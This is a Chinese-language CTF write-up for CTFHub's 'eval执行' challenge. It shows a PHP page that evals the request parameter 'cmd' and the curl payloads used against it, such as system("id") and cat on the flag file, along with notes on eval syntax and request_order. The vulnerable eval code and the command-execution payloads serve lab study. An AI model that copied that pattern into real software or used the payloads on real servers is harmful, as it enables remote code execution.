---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - eval执行"
date: 2026-10-28

skill: "web-rce/eval执行"
completed: true
---

# CTFHub Writeup - eval执行

## 题目类型

Web

## 题目描述

<?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?>

## 解题过程

<br>1. 用户记录源码共 108 字节，核心逻辑为：未传入 cmd 时调用 highlight\_file 打印自身源码；传入 cmd 时通过 eval 将字符串作为 PHP 代码执行，并记录 eval 是 PHP 的语言结构，用于执行字符串形式的 PHP 代码。
<br>2. 用户使用 curl.exe -s 请求 http://.../?cmd=system(%22id%22)%3B，返回 uid=33(www-data) gid=33(www-data) groups=33(www-data)；记录 payload 不能带 \<?php ?\> 标签，语句需要带分号，本题 display\_errors 关闭，缺少分号会表现为空白响应。
<br>3. 用户测试 $\_REQUEST 传参：GET 方式 ?cmd=system(%22id%22)%3B 执行成功，POST 方式 -d 'cmd=system(%22id%22)%3B' 执行成功，Cookie 方式 -b 'cmd=system(%22whoami%22)%3B' 返回源码页；记录 PHP 5.3+ 默认 request\_order 为 GP，不合并 Cookie。
<br>4. 用户执行 ?cmd=system(%22ls -la /%22)%3B 列出根目录，发现 -rw-r--r-- 1 root root 33 Oct 28 20:13 flag\_27981；随后执行 ?cmd=system(%22cat /flag\_27981%22)%3B，得到 ctfhub\{cbee00eade53713f590cd7d6\}。

## 疑问与解答

### 1.

<br>问题：为什么 eval 的 payload 不能带 \<?php ?\> 标签？
<br>解答：eval 是在 PHP 模式内部执行字符串，传入内容会被当作 PHP 代码片段解析；再写 \<?php ?\> 会引入非法语法，导致解析错误。

### 2.

<br>问题：为什么命令语句末尾要带分号？
<br>解答：eval 执行的是 PHP 代码片段，分号用于结束语句；缺少分号会触发 Parse Error，在 display\_errors 关闭时可能表现为空白响应。

### 3.

<br>问题：为什么 Cookie 传 cmd 没有返回命令结果？
<br>解答：$\_REQUEST 是否合并 Cookie 取决于 request\_order；PHP 5.3+ 默认 request\_order 为 GP，只合并 GET 与 POST，因此本题 Cookie 中的 cmd 不会被当作参数处理。


## 本题的核心逻辑：


<br>本题源码在未传入 cmd 时调用 highlight\_file 输出自身源码，传入 cmd 后直接 eval 执行用户可控字符串；由于 eval 能执行任意 PHP 代码，攻击者可用 system 等函数调用系统命令，进而读取根目录下带随机后缀的 flag 文件。


## 笔记

这道题主要学习了：

<br>1. 本题展示了 PHP eval 执行漏洞的典型利用链：源码泄露帮助确认参数入口，eval 将输入当作 PHP 代码执行，system 进一步执行系统命令；payload 需符合 PHP 代码片段语法，不能重复包裹 PHP 标签，语句要完整结束。
<br>2. 后续可学习 $\_REQUEST 与 request\_order 的关系、命令执行结果回显方式，以及 disable\_functions、过滤规则等限制下的绕过思路。
